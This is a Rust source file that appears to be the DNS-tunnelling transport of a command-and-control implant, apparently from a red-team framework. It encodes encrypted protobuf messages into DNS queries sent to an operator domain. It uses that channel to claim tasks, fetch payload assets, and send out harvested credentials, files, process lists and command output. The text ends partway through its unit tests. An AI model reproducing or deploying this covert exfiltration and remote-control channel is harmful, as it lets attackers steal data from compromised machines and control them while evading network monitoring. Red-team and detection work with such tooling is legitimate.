use crate::Transport;
use anyhow::{Context, Result};
use pb::c2::*;
use pb::config::Config;
use pb::dns::*;
use prost::Message;
use std::sync::mpsc::{Receiver, Sender};
use tokio::net::UdpSocket;

// Protocol limits
const MAX_LABEL_LENGTH: usize = 63;
const MAX_DNS_NAME_LENGTH: usize = 253;
const CONV_ID_LENGTH: usize = 8;
const DNS_RESPONSE_BUF_SIZE: usize = 4096;

// Async protocol configuration
const SEND_WINDOW_SIZE: usize = 10; // Packets in flight
const MAX_RETRIES_PER_CHUNK: u32 = 3; // Max retries for a chunk
const MAX_DATA_SIZE: usize = 50 * 1024 * 1024; // 50MB max data size

// DNS resolver fallbacks
const FALLBACK_DNS_SERVERS: &[&str] = &["1.1.1.1:53", "8.8.8.8:53"];

/// DNS record type for queries
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DnsRecordType {
    TXT,  // Text records (default, base32 encoded)
    A,    // IPv4 address records (binary data)
    AAAA, // IPv6 address records (binary data)
}

/// DNS transport using stateless packet protocol with protobuf
#[derive(Debug, Clone)]
pub struct DNS {
    base_domain: String,
    dns_servers: Vec<String>, // Primary + fallback DNS servers
    current_server_index: usize,
    record_type: DnsRecordType, // DNS record type to use for queries
}

impl DNS {
    /// Marshal request using ChaCha encoding
    fn marshal_with_codec<Req, Resp>(msg: Req) -> Result<Vec<u8>>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        pb::xchacha::encode_with_chacha::<Req, Resp>(msg)
    }

    /// Unmarshal response using ChaCha encoding
    fn unmarshal_with_codec<Req, Resp>(data: &[u8]) -> Result<Resp>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        pb::xchacha::decode_with_chacha::<Req, Resp>(data)
    }

    /// Generate unique conversation ID
    fn generate_conv_id() -> String {
        use rand::Rng;
        const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
        let mut rng = rand::thread_rng();
        (0..CONV_ID_LENGTH)
            .map(|_| {
                let idx = rng.gen_range(0..CHARSET.len());
                CHARSET[idx] as char
            })
            .collect()
    }

    /// Calculate CRC32 checksum
    fn calculate_crc32(data: &[u8]) -> u32 {
        let mut crc = 0xffffffffu32;
        for &byte in data {
            crc ^= byte as u32;
            for _ in 0..8 {
                if crc & 1 != 0 {
                    crc = (crc >> 1) ^ 0xedb88320;
                } else {
                    crc >>= 1;
                }
            }
        }
        !crc
    }

    /// Calculate maximum data size that will fit in DNS query
    fn calculate_max_chunk_size(&self, total_chunks: u32) -> usize {
        // DNS limit: total_length <= 253
        // Format: <label1>.<label2>....<labelN>.<base_domain>
        // total_length = encoded_length + ceil(encoded_length / 63) + base_domain_length

        let base_domain_len = self.base_domain.len();
        let available = MAX_DNS_NAME_LENGTH.saturating_sub(base_domain_len);

        // Calculate max encoded length where: encoded + ceil(encoded/63) <= available
        // For n complete labels (63 chars each): n*63 + n = n*64
        // So: floor(available / 64) * 63 gives us the safe amount
        let complete_labels = available / 64;
        let max_encoded_length = complete_labels * 63;

        // Base32: 5 bytes protobuf -> 8 chars encoded
        // protobuf_length = encoded_length * 5 / 8
        let max_protobuf_length = (max_encoded_length * 5) / 8;

        // Calculate protobuf overhead with worst-case varint sizes
        let sample_packet = DnsPacket {
            r#type: PacketType::Data as i32,
            sequence: total_chunks,
            conversation_id: "a".repeat(CONV_ID_LENGTH),
            data: vec![],
            crc32: 0xFFFFFFFF,
            window_size: SEND_WINDOW_SIZE as u32,
            acks: vec![],
            nacks: vec![],
        };

        let overhead = sample_packet.encoded_len();

        // Max data size is what fits after overhead
        max_protobuf_length.saturating_sub(overhead)
    }

    /// Encode data using Base32 (DNS-safe, case-insensitive)
    fn encode_data(data: &[u8]) -> String {
        // Use RFC4648 alphabet (A-Z, 2-7) without padding, converted to lowercase
        base32::encode(base32::Alphabet::Rfc4648 { padding: false }, data).to_lowercase()
    }

    /// Build DNS query subdomain from packet
    /// Format: <base32_encoded_packet>.<base_domain>
    /// Base32 data is split into 63-char labels, total length <= 253 chars
    fn build_subdomain(&self, packet: &DnsPacket) -> Result<String> {
        // Serialize packet to protobuf
        let mut buf = Vec::new();
        packet.encode(&mut buf)?;

        // Encode entire packet as Base32 (includes all metadata)
        let encoded = Self::encode_data(&buf);

        // Calculate total length
        let base_domain_len = self.base_domain.len();
        let num_labels = (encoded.len() + MAX_LABEL_LENGTH - 1) / MAX_LABEL_LENGTH;
        let total_len = encoded.len() + num_labels + base_domain_len; // +num_labels for dots between labels, +1 for dot before base_domain

        if total_len > MAX_DNS_NAME_LENGTH {
            return Err(anyhow::anyhow!(
                "DNS query too long: {} chars (max {}). protobuf={} bytes, encoded={} chars, labels={}, base_domain={} chars. Data in packet was {} bytes.",
                total_len,
                MAX_DNS_NAME_LENGTH,
                buf.len(),
                encoded.len(),
                num_labels,
                base_domain_len,
                packet.data.len()
            ));
        }

        // Split encoded data
        let mut labels = Vec::new();
        let mut remaining = encoded.as_str();
        while remaining.len() > MAX_LABEL_LENGTH {
            let (chunk, rest) = remaining.split_at(MAX_LABEL_LENGTH);
            labels.push(chunk);
            remaining = rest;
        }
        if !remaining.is_empty() {
            labels.push(remaining);
        }

        // Build final domain: <label1>.<label2>....<base_domain>
        labels.push(&self.base_domain);
        Ok(labels.join("."))
    }

    /// Send packet and get response with resolver fallback
    async fn send_packet(&mut self, packet: DnsPacket) -> Result<Vec<u8>> {
        let subdomain = self.build_subdomain(&packet)?;
        let (query, txid) = self.build_dns_query(&subdomain)?;

        // Try each DNS server in order
        let mut last_error = None;
        for attempt in 0..self.dns_servers.len() {
            let server_idx = (self.current_server_index + attempt) % self.dns_servers.len();
            let server = &self.dns_servers[server_idx];

            match self.try_dns_query(server, &query, txid).await {
                Ok(response) => {
                    // Update current server on success
                    self.current_server_index = server_idx;
                    return Ok(response);
                }
                Err(e) => {
                    last_error = Some(e);
                    // Continue to next resolver
                }
            }
        }

        Err(last_error.unwrap_or_else(|| anyhow::anyhow!("all DNS servers failed")))
    }

    /// Try a single DNS query against a specific server
    async fn try_dns_query(
        &self,
        server: &str,
        query: &[u8],
        expected_txid: u16,
    ) -> Result<Vec<u8>> {
        // Create UDP socket with timeout
        let socket = UdpSocket::bind("0.0.0.0:0").await?;
        socket.connect(server).await?;

        // Send query
        socket.send(query).await?;

        // Receive response with timeout
        let mut buf = vec![0u8; DNS_RESPONSE_BUF_SIZE];
        let timeout_duration = std::time::Duration::from_secs(5);
        let len = tokio::time::timeout(timeout_duration, socket.recv(&mut buf))
            .await
            .map_err(|_| anyhow::anyhow!("timeout"))
            .context("DNS query timeout")??;
        buf.truncate(len);

        // Parse and validate response
        self.parse_dns_response(&buf, expected_txid)
    }

    /// Build DNS query packet with random transaction ID
    fn build_dns_query(&self, domain: &str) -> Result<(Vec<u8>, u16)> {
        let mut query = Vec::new();

        // Transaction ID
        let txid = rand::random::<u16>();
        query.extend_from_slice(&txid.to_be_bytes());
        // Flags: standard query
        query.extend_from_slice(&[0x01, 0x00]);
        // Questions: 1
        query.extend_from_slice(&[0x00, 0x01]);
        // Answer RRs: 0
        query.extend_from_slice(&[0x00, 0x00]);
        // Authority RRs: 0
        query.extend_from_slice(&[0x00, 0x00]);
        // Additional RRs: 0
        query.extend_from_slice(&[0x00, 0x00]);

        // Question section
        for label in domain.split('.') {
            if label.is_empty() {
                continue;
            }
            query.push(label.len() as u8);
            query.extend_from_slice(label.as_bytes());
        }
        query.push(0x00); // End of domain

        // Type and Class based on record_type
        match self.record_type {
            DnsRecordType::TXT => {
                // Type: TXT (16)
                query.extend_from_slice(&[0x00, 0x10]);
            }
            DnsRecordType::A => {
                // Type: A (1)
                query.extend_from_slice(&[0x00, 0x01]);
            }
            DnsRecordType::AAAA => {
                // Type: AAAA (28)
                query.extend_from_slice(&[0x00, 0x1c]);
            }
        }
        // Class: IN (1)
        query.extend_from_slice(&[0x00, 0x01]);

        Ok((query, txid))
    }

    /// Parse DNS response based on record type, validating transaction ID
    fn parse_dns_response(&self, response: &[u8], expected_txid: u16) -> Result<Vec<u8>> {
        if response.len() < 12 {
            return Err(anyhow::anyhow!("DNS response too short"));
        }

        // Validate transaction ID
        let response_txid = u16::from_be_bytes([response[0], response[1]]);
        if response_txid != expected_txid {
            return Err(anyhow::anyhow!(
                "DNS transaction ID mismatch: expected {}, got {}",
                expected_txid,
                response_txid
            ));
        }

        // Read answer count from header
        let answer_count = u16::from_be_bytes([response[6], response[7]]) as usize;

        // Skip to answer section
        let mut offset = 12;

        // Skip question section
        while offset < response.len() && response[offset] != 0 {
            let len = response[offset] as usize;
            offset += len + 1;
        }
        offset += 5; // Skip null terminator, type, and class

        // Parse all answer records and concatenate data
        let mut all_data = Vec::new();

        for _ in 0..answer_count {
            if offset + 10 > response.len() {
                return Err(anyhow::anyhow!("Invalid DNS response format"));
            }

            // Skip name (2 bytes pointer), type (2), class (2), TTL (4)
            offset += 10;

            // Read data length
            let data_len = u16::from_be_bytes([response[offset], response[offset + 1]]) as usize;
            offset += 2;

            if offset + data_len > response.len() {
                return Err(anyhow::anyhow!("Invalid DNS record length"));
            }

            // Parse based on record type
            match self.record_type {
                DnsRecordType::TXT => {
                    // TXT records have length-prefixed strings
                    let mut txt_offset = offset;
                    while txt_offset < offset + data_len {
                        let str_len = response[txt_offset] as usize;
                        txt_offset += 1;
                        if txt_offset + str_len > offset + data_len {
                            break;
                        }
                        all_data.extend_from_slice(&response[txt_offset..txt_offset + str_len]);
                        txt_offset += str_len;
                    }
                }
                DnsRecordType::A | DnsRecordType::AAAA => {
                    // A records are 4 bytes, AAAA records are 16 bytes - append raw binary
                    all_data.extend_from_slice(&response[offset..offset + data_len]);
                }
            }

            offset += data_len;
        }

        // For A/AAAA records, data is base32-encoded text that needs decoding
        if matches!(self.record_type, DnsRecordType::A | DnsRecordType::AAAA) {
            // Trim null bytes from padding in A/AAAA records
            while all_data.last() == Some(&0) {
                all_data.pop();
            }

            let encoded_str =
                String::from_utf8(all_data).context("invalid UTF-8 in A/AAAA response")?;
            all_data = base32::decode(
                base32::Alphabet::Rfc4648 { padding: false },
                &encoded_str.to_uppercase(),
            )
            .ok_or_else(|| anyhow::anyhow!("base32 decode failed"))
            .context("failed to decode base32 from A/AAAA records")?;
        }

        Ok(all_data)
    }

    async fn dns_exchange<Req, Resp>(&mut self, request: Req, method_code: &str) -> Result<Resp>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        // Marshal request
        let request_data = Self::marshal_with_codec::<Req, Resp>(request)?;

        // Send raw bytes and unmarshal response
        let response_data = self.dns_exchange_raw(request_data, method_code).await?;
        Self::unmarshal_with_codec::<Req, Resp>(&response_data)
    }

    /// Validate request data and calculate optimal chunking strategy
    fn validate_and_prepare_chunks(&self, request_data: &[u8]) -> Result<(usize, usize, u32)> {
        // Validate data size
        if request_data.len() > MAX_DATA_SIZE {
            return Err(anyhow::anyhow!(
                "Request data exceeds maximum size: {} bytes > {} bytes",
                request_data.len(),
                MAX_DATA_SIZE
            ));
        }

        // Calculate exact chunk_size and total_chunks using varint boundary solving
        // Protobuf varints encode differently based on value:
        // [1, 127] → 1 byte, [128, 16383] → 2 bytes, [16384, 2097151] → 3 bytes
        let (chunk_size, total_chunks) = if request_data.is_empty() {
            (self.calculate_max_chunk_size(1), 1)
        } else {
            let varint_ranges = [(1u32, 127u32), (128u32, 16383u32), (16384u32, 2097151u32)];

            let mut result = None;
            for (min_chunks, max_chunks) in varint_ranges.iter() {
                // Calculate overhead assuming worst case (max sequence in this range)
                let chunk_size = self.calculate_max_chunk_size(*max_chunks);
                let total_chunks = ((request_data.len() + chunk_size - 1) / chunk_size).max(1);

                // Check if the calculated total_chunks falls within this range
                if total_chunks >= *min_chunks as usize && total_chunks <= *max_chunks as usize {
                    // Found the correct range - this is exact
                    result = Some((chunk_size, total_chunks));
                    break;
                }
            }

            // Fallback for very large data
            result.unwrap_or_else(|| {
                let chunk_size = self.calculate_max_chunk_size(2097151);
                let total_chunks = ((request_data.len() + chunk_size - 1) / chunk_size).max(1);
                (chunk_size, total_chunks)
            })
        };

        let data_crc = Self::calculate_crc32(request_data);

        #[cfg(debug_assertions)]
        log::debug!(
            "DNS: Request size={} bytes, chunks={}, chunk_size={} bytes, crc32={:#x}",
            request_data.len(),
            total_chunks,
            chunk_size,
            data_crc
        );

        Ok((chunk_size, total_chunks, data_crc))
    }

    /// Send INIT packet to start a new conversation
    async fn send_init_packet(
        &mut self,
        conv_id: &str,
        method_code: &str,
        total_chunks: usize,
        data_size: usize,
        data_crc: u32,
    ) -> Result<()> {
        let init_payload = InitPayload {
            method_code: method_code.to_string(),
            total_chunks: total_chunks as u32,
            data_crc32: data_crc,
            file_size: data_size as u32,
        };
        let mut init_payload_bytes = Vec::new();
        init_payload.encode(&mut init_payload_bytes)?;

        #[cfg(debug_assertions)]
        log::debug!(
            "DNS: INIT packet - conv_id={}, method={}, total_chunks={}, file_size={}, data_crc32={:#x}",
            conv_id, method_code, total_chunks, data_size, data_crc
        );

        let init_packet = DnsPacket {
            r#type: PacketType::Init as i32,
            sequence: 0,
            conversation_id: conv_id.to_string(),
            data: init_payload_bytes,
            crc32: 0,
            window_size: SEND_WINDOW_SIZE as u32,
            acks: vec![],
            nacks: vec![],
        };

        self.send_packet(init_packet)
            .await
            .context("failed to send INIT packet")?;

        #[cfg(debug_assertions)]
        log::debug!("DNS: INIT sent for conv_id={}", conv_id);

        Ok(())
    }

    /// Process a single chunk response and extract ACKs/NACKs
    fn process_chunk_response(
        response_data: &[u8],
        seq_num: u32,
        total_chunks: usize,
    ) -> Result<(Vec<u32>, Vec<u32>)> {
        let mut acks = Vec::new();
        let mut nacks = Vec::new();

        if let Ok(status_packet) = DnsPacket::decode(response_data) {
            if status_packet.r#type == PacketType::Status as i32 {
                // Process ACKs - collect acknowledged sequences
                for ack_range in &status_packet.acks {
                    for ack_seq in ack_range.start_seq..=ack_range.end_seq {
                        acks.push(ack_seq);
                    }
                }

                // Process NACKs - collect sequences needing retransmission
                for &nack_seq in &status_packet.nacks {
                    if nack_seq >= 1 && nack_seq <= total_chunks as u32 {
                        nacks.push(nack_seq);
                    }
                }
            }
        } else {
            #[cfg(debug_assertions)]
            log::debug!(
                "DNS: Unknown response format ({} bytes), retrying chunk",
                response_data.len()
            );
            nacks.push(seq_num);
        }

        Ok((acks, nacks))
    }

    /// Send data chunks concurrently with windowed transmission
    async fn send_data_chunks_concurrent(
        &mut self,
        chunks: &[Vec<u8>],
        conv_id: &str,
        total_chunks: usize,
    ) -> Result<(
        std::collections::HashSet<u32>,
        std::collections::HashSet<u32>,
    )> {
        use std::collections::HashSet;

        let mut acknowledged = HashSet::new();
        let mut nack_set = HashSet::new();
        let mut send_tasks = Vec::new();

        for seq in 1..=total_chunks {
            let seq_u32 = seq as u32;

            if acknowledged.contains(&seq_u32) {
                continue;
            }

            let chunk = chunks[seq - 1].clone();
            let conv_id_clone = conv_id.to_string();
            let mut transport_clone = self.clone();

            // Spawn concurrent task for this packet
            let task = tokio::spawn(async move {
                let data_packet = DnsPacket {
                    r#type: PacketType::Data as i32,
                    sequence: seq_u32,
                    conversation_id: conv_id_clone,
                    data: chunk.clone(),
                    crc32: Self::calculate_crc32(&chunk),
                    window_size: SEND_WINDOW_SIZE as u32,
                    acks: vec![],
                    nacks: vec![],
                };

                let result = transport_clone.send_packet(data_packet).await;
                (seq_u32, result)
            });

            send_tasks.push(task);

            // Limit concurrent tasks to SEND_WINDOW_SIZE
            if send_tasks.len() >= SEND_WINDOW_SIZE {
                if let Some(task) = send_tasks.first_mut() {
                    if let Ok(task_result) = task.await {
                        self.handle_chunk_task_result(
                            task_result,
                            &mut acknowledged,
                            &mut nack_set,
                            total_chunks,
                        )?;
                    }
                    send_tasks.remove(0);
                }
            }
        }

        // Wait for all remaining tasks to complete
        for task in send_tasks {
            if let Ok(task_result) = task.await {
                self.handle_chunk_task_result(
                    task_result,
                    &mut acknowledged,
                    &mut nack_set,
                    total_chunks,
                )?;
            }
        }

        Ok((acknowledged, nack_set))
    }

    /// Handle the result of a chunk transmission task
    fn handle_chunk_task_result(
        &self,
        task_result: (u32, Result<Vec<u8>>),
        acknowledged: &mut std::collections::HashSet<u32>,
        nack_set: &mut std::collections::HashSet<u32>,
        total_chunks: usize,
    ) -> Result<()> {
        match task_result {
            (seq_num, Ok(response_data)) => {
                let (acks, nacks) =
                    Self::process_chunk_response(&response_data, seq_num, total_chunks)?;
                acknowledged.extend(acks);
                nack_set.extend(nacks);
            }
            (seq_num, Err(e)) => {
                let err_msg = e.to_string();
                #[cfg(debug_assertions)]
                log::error!("Failed to send chunk {}: {}", seq_num, err_msg);

                // If packet is too long, this is a fatal error
                if err_msg.contains("DNS query too long") {
                    return Err(anyhow::anyhow!(
                        "Chunk {} is too large to fit in DNS query: {}",
                        seq_num,
                        err_msg
                    ));
                }

                // Otherwise, mark for retry
                nack_set.insert(seq_num);
            }
        }
        Ok(())
    }

    /// Retry NACKed chunks with retry limit
    async fn retry_nacked_chunks(
        &mut self,
        chunks: &[Vec<u8>],
        conv_id: &str,
        total_chunks: usize,
        mut nack_set: std::collections::HashSet<u32>,
        acknowledged: &mut std::collections::HashSet<u32>,
    ) -> Result<()> {
        use std::collections::HashMap;

        let mut retry_counts: HashMap<u32, u32> = HashMap::new();

        while !nack_set.is_empty() {
            let nacks_to_retry: Vec<u32> = nack_set.drain().collect();

            for nack_seq in nacks_to_retry {
                // Check retry limit
                let retries = retry_counts.entry(nack_seq).or_insert(0);
                if *retries >= MAX_RETRIES_PER_CHUNK {
                    return Err(anyhow::anyhow!(
                        "Max retries exceeded for chunk {}",
                        nack_seq
                    ));
                }
                *retries += 1;

                // Skip if already acknowledged
                if acknowledged.contains(&nack_seq) {
                    continue;
                }

                if let Some(chunk) = chunks.get((nack_seq - 1) as usize) {
                    let retransmit_packet = DnsPacket {
                        r#type: PacketType::Data as i32,
                        sequence: nack_seq,
                        conversation_id: conv_id.to_string(),
                        data: chunk.clone(),
                        crc32: Self::calculate_crc32(chunk),
                        window_size: SEND_WINDOW_SIZE as u32,
                        acks: vec![],
                        nacks: vec![],
                    };

                    match self.send_packet(retransmit_packet).await {
                        Ok(response_data) => {
                            let (acks, nacks) = Self::process_chunk_response(
                                &response_data,
                                nack_seq,
                                total_chunks,
                            )?;

                            // Process ACKs
                            for ack_seq in acks {
                                acknowledged.insert(ack_seq);
                                retry_counts.remove(&ack_seq);
                            }

                            // Process NACKs
                            for new_nack in nacks {
                                if !acknowledged.contains(&new_nack) {
                                    nack_set.insert(new_nack);
                                }
                            }
                        }
                        Err(_) => {
                            // Retry failed - add back to NACK set
                            nack_set.insert(nack_seq);
                        }
                    }
                }
            }
        }

        Ok(())
    }

    /// Fetch response from server, handling potentially chunked responses
    async fn fetch_response(&mut self, conv_id: &str, total_chunks: usize) -> Result<Vec<u8>> {
        #[cfg(debug_assertions)]
        log::debug!(
            "DNS: All {} chunks acknowledged, sending FETCH",
            total_chunks
        );

        let fetch_packet = DnsPacket {
            r#type: PacketType::Fetch as i32,
            sequence: (total_chunks + 1) as u32,
            conversation_id: conv_id.to_string(),
            data: vec![],
            crc32: 0,
            window_size: 0,
            acks: vec![],
            nacks: vec![],
        };

        let end_response = self
            .send_packet(fetch_packet)
            .await
            .context("failed to fetch response from server")?;

        #[cfg(debug_assertions)]
        log::debug!(
            "DNS: FETCH response received ({} bytes)",
            end_response.len()
        );

        // Validate response is not empty
        if end_response.is_empty() {
            return Err(anyhow::anyhow!("Server returned empty response."));
        }

        // Check if response is chunked
        if let Ok(metadata) = ResponseMetadata::decode(&end_response[..]) {
            if metadata.total_chunks > 0 {
                return self
                    .fetch_chunked_response(conv_id, total_chunks, &metadata)
                    .await;
            }
        }

        Ok(end_response)
    }

    /// Fetch and reassemble a chunked response from server
    async fn fetch_chunked_response(
        &mut self,
        conv_id: &str,
        base_sequence: usize,
        metadata: &ResponseMetadata,
    ) -> Result<Vec<u8>> {
        let total_chunks = metadata.total_chunks as usize;
        let expected_crc = metadata.data_crc32;
        let mut full_response = Vec::new();

        for chunk_idx in 1..=total_chunks {
            let fetch_payload = FetchPayload {
                chunk_index: chunk_idx as u32,
            };
            let mut fetch_payload_bytes = Vec::new();
            fetch_payload.encode(&mut fetch_payload_bytes)?;

            let fetch_packet = DnsPacket {
                r#type: PacketType::Fetch as i32,
                sequence: (base_sequence as u32 + 2 + chunk_idx as u32),
                conversation_id: conv_id.to_string(),
                data: fetch_payload_bytes,
                crc32: 0,
                window_size: 0,
                acks: vec![],
                nacks: vec![],
            };

            let chunk_data = self.send_packet(fetch_packet).await?;
            full_response.extend_from_slice(&chunk_data);
        }

        let actual_crc = Self::calculate_crc32(&full_response);
        if actual_crc != expected_crc {
            return Err(anyhow::anyhow!(
                "Response CRC mismatch: expected {}, got {}",
                expected_crc,
                actual_crc
            ));
        }

        Ok(full_response)
    }

    async fn dns_exchange_raw(
        &mut self,
        request_data: Vec<u8>,
        method_code: &str,
    ) -> Result<Vec<u8>> {
        // Validate and prepare chunks
        let (chunk_size, total_chunks, data_crc) =
            self.validate_and_prepare_chunks(&request_data)?;

        // Generate conversation ID
        let conv_id = Self::generate_conv_id();

        // Send INIT packet
        self.send_init_packet(
            &conv_id,
            method_code,
            total_chunks,
            request_data.len(),
            data_crc,
        )
        .await?;

        // Prepare chunks
        let chunks: Vec<Vec<u8>> = request_data
            .chunks(chunk_size)
            .map(|chunk| chunk.to_vec())
            .collect();

        // Send all chunks using concurrent windowed transmission
        let (mut acknowledged, nack_set) = self
            .send_data_chunks_concurrent(&chunks, &conv_id, total_chunks)
            .await?;

        // Retry NACKed chunks
        self.retry_nacked_chunks(&chunks, &conv_id, total_chunks, nack_set, &mut acknowledged)
            .await?;

        // Verify all chunks acknowledged
        if acknowledged.len() != total_chunks {
            return Err(anyhow::anyhow!(
                "Not all chunks acknowledged after max retries: {}/{} chunks. Missing: {:?}",
                acknowledged.len(),
                total_chunks,
                (1..=total_chunks as u32)
                    .filter(|seq| !acknowledged.contains(seq))
                    .collect::<Vec<_>>()
            ));
        }

        // Fetch response from server
        self.fetch_response(&conv_id, total_chunks).await
    }
}

impl Transport for DNS {
    fn init() -> Self {
        DNS {
            base_domain: String::new(),
            dns_servers: Vec::new(),
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        }
    }

    fn new(callback: String, _config: Config) -> Result<Self> {
        // Parse DNS URL formats:
        // dns://server:port?domain=dnsc2.realm.pub&type=txt (single server, TXT records)
        // dns://*?domain=dnsc2.realm.pub&type=a (use system DNS + fallbacks, A records)
        // dns://8.8.8.8:53,1.1.1.1:53?domain=dnsc2.realm.pub&type=aaaa (multiple servers, AAAA records)
        let url = if callback.starts_with("dns://") {
            callback
        } else {
            format!("dns://{}", callback)
        };

        let parsed = url::Url::parse(&url)?;
        let base_domain = parsed
            .query_pairs()
            .find(|(k, _)| k == "domain")
            .map(|(_, v)| v.to_string())
            .ok_or_else(|| anyhow::anyhow!("domain parameter is required"))?
            .to_string();

        if base_domain.is_empty() {
            return Err(anyhow::anyhow!("domain parameter cannot be empty"));
        }

        // Parse record type from URL (default: TXT)
        let record_type = parsed
            .query_pairs()
            .find(|(k, _)| k == "type")
            .map(|(_, v)| match v.to_lowercase().as_str() {
                "a" => DnsRecordType::A,
                "aaaa" => DnsRecordType::AAAA,
                _ => DnsRecordType::TXT,
            })
            .unwrap_or(DnsRecordType::TXT);

        let mut dns_servers = Vec::new();

        // Check if using wildcard for system DNS
        if let Some(host) = parsed.host_str() {
            if host == "*" {
                // Use system DNS servers + fallbacks
                #[cfg(feature = "dns")]
                {
                    use hickory_resolver::system_conf::read_system_conf;
                    if let Ok((config, _opts)) = read_system_conf() {
                        for server in config.name_servers() {
                            dns_servers.push(format!("{}:53", server.socket_addr.ip()));
                        }
                    }
                }
                // Add fallbacks
                dns_servers.extend(FALLBACK_DNS_SERVERS.iter().map(|s| s.to_string()));
            } else {
                // Parse comma-separated servers or single server
                for server_part in host.split(',') {
                    let server = server_part.trim();
                    let port = parsed.port().unwrap_or(53);
                    dns_servers.push(format!("{}:{}", server, port));
                }
            }
        }

        // If no servers configured, use fallbacks
        if dns_servers.is_empty() {
            dns_servers.extend(FALLBACK_DNS_SERVERS.iter().map(|s| s.to_string()));
        }

        Ok(DNS {
            base_domain,
            dns_servers,
            current_server_index: 0,
            record_type,
        })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        self.dns_exchange(request, "/c2.C2/ClaimTasks").await
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        sender: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        // Send fetch request and get raw response bytes
        let response_bytes = self
            .dns_exchange_raw(
                Self::marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request)?,
                "/c2.C2/FetchAsset",
            )
            .await?;

        // Parse length-prefixed encrypted chunks and send each one
        let mut offset = 0;
        while offset < response_bytes.len() {
            // Check if we have enough bytes for length prefix
            if offset + 4 > response_bytes.len() {
                break;
            }

            // Read 4-byte length prefix (big-endian)
            let chunk_len = u32::from_be_bytes([
                response_bytes[offset],
                response_bytes[offset + 1],
                response_bytes[offset + 2],
                response_bytes[offset + 3],
            ]) as usize;
            offset += 4;

            // Check if we have the full chunk
            if offset + chunk_len > response_bytes.len() {
                return Err(anyhow::anyhow!(
                    "Invalid chunk length: {} bytes at offset {}, total size {}",
                    chunk_len,
                    offset - 4,
                    response_bytes.len()
                ));
            }

            // Extract and decrypt chunk
            let encrypted_chunk = &response_bytes[offset..offset + chunk_len];
            let chunk_response = Self::unmarshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(
                encrypted_chunk,
            )?;

            // Send chunk through channel
            sender
                .send(chunk_response)
                .map_err(|_| anyhow::anyhow!("receiver dropped"))
                .context("failed to send chunk")?;

            offset += chunk_len;
        }

        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        self.dns_exchange(request, "/c2.C2/ReportCredential").await
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        // Spawn a task to collect chunks from the sync channel receiver
        // This is necessary because iterating over the sync receiver would block the async task
        let handle = tokio::spawn(async move {
            let mut all_chunks = Vec::new();

            for chunk in request {
                let chunk_bytes =
                    Self::marshal_with_codec::<ReportFileRequest, ReportFileResponse>(chunk)?;
                // Prefix each chunk with its length (4 bytes, big-endian)
                all_chunks.extend_from_slice(&(chunk_bytes.len() as u32).to_be_bytes());
                all_chunks.extend_from_slice(&chunk_bytes);
            }

            Ok::<Vec<u8>, anyhow::Error>(all_chunks)
        });

        // Wait for the spawned task to complete
        let all_chunks = handle
            .await
            .context("failed to join chunk collection task")??;

        if all_chunks.is_empty() {
            return Err(anyhow::anyhow!("No file data provided"));
        }

        // Send all chunks as a single DNS exchange
        let response_bytes = self
            .dns_exchange_raw(all_chunks, "/c2.C2/ReportFile")
            .await?;

        // Unmarshal response
        Self::unmarshal_with_codec::<ReportFileRequest, ReportFileResponse>(&response_bytes)
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        self.dns_exchange(request, "/c2.C2/ReportProcessList").await
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        self.dns_exchange(request, "/c2.C2/ReportTaskOutput").await
    }

    async fn reverse_shell(
        &mut self,
        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        Err(anyhow::anyhow!(
            "reverse_shell not supported over DNS transport"
        ))
    }

    fn get_type(&mut self) -> pb::c2::transport::Type {
        pb::c2::transport::Type::TransportDns
    }

    async fn create_portal(
        &mut self,
        _rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
        _tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
    ) -> Result<()> {
        Err(anyhow::anyhow!(
            "create_portal not supported over DNS transport"
        ))
    }

    fn is_active(&self) -> bool {
        !self.base_domain.is_empty() && !self.dns_servers.is_empty()
    }

    fn name(&self) -> &'static str {
        "dns"
    }

    fn list_available(&self) -> Vec<String> {
        vec!["dns".to_string()]
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use pb::dns::PacketType;

    // ============================================================
    // CRC32 Tests
    // ============================================================

    #[test]
    fn test_crc32_basic() {
        let data = b"test data for CRC validation";
        let crc = DNS::calculate_crc32(data);

        // Verify same data produces same CRC
        let crc2 = DNS::calculate_crc32(data);
        assert_eq!(crc, crc2);

        // Verify different data produces different CRC
        let crc3 = DNS::calculate_crc32(b"test datA for CRC validation");
        assert_ne!(crc, crc3);
    }

    #[test]
    fn test_crc32_known_value() {
        // CRC32 IEEE of "123456789" is 0xCBF43926
        let data = b"123456789";
        let crc = DNS::calculate_crc32(data);
        assert_eq!(crc, 0xCBF43926);
    }

    #[test]
    fn test_generate_conv_id_length() {
        let conv_id = DNS::generate_conv_id();
        assert_eq!(conv_id.len(), CONV_ID_LENGTH);
    }

    #[test]
    fn test_generate_conv_id_charset() {
        let conv_id = DNS::generate_conv_id();
        for c in conv_id.chars() {
            assert!(c.is_ascii_lowercase() || c.is_ascii_digit());
        }
    }

    #[test]
    fn test_generate_conv_id_uniqueness() {
        let id1 = DNS::generate_conv_id();
        let id2 = DNS::generate_conv_id();
        // Statistically, two random 8-char IDs should not be equal
        assert_ne!(id1, id2);
    }

    #[test]
    fn test_encode_data_lowercase() {
        let data = b"hello";
        let encoded = DNS::encode_data(data);

